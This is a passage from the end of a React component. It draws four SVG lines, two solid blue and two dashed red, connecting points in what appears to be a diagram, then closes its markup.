            <line x1="20%" y1="30%" x2="60%" y2="20%" stroke="#3b82f6" strokeWidth="1" />
            <line x1="60%" y1="20%" x2="80%" y2="40%" stroke="#3b82f6" strokeWidth="1" />
            <line x1="80%" y1="40%" x2="85%" y2="55%" stroke="#ef4444" strokeWidth="1" strokeDasharray="4" />
            <line x1="40%" y1="80%" x2="85%" y2="55%" stroke="#ef4444" strokeWidth="1" strokeDasharray="4" />
         </svg>
      </div>
    </div>
  );
};
